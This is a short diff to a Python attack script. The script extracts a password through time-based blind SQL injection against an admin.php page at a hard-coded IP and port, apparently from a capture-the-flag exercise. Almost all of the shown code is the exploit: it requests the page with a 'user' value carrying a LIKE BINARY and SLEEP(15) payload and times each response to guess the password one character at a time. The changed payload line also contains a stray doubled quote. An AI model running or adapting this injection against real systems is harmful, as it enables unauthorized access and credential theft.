@@ -1,6 +1,6 @@
 import requests, time
 
-url = 'http://139.180.137.27:11324/admin.php?'
+url = 'http://139.180.137.27:11324/admin.php'
 
 def time_get_page(query_dict, password):
 	print('\tTrying password "{0}..."'.format(password))
@@ -19,7 +19,7 @@ def get_password():
 			return password
 		password_times = {
 			time_get_page({
-				"user": 'doghunter" AND pass LIKE BINARY "{0}" AND SLEEP(15) #'.format("".join([password, char, '%']))
+				"user": "doghunter' AND pass LIKE BINARY '{0}'' AND SLEEP(15) #".format("".join([password, char, '%']))
 			}, "".join([password, char])): char
 			for char in possible_chars
 		}
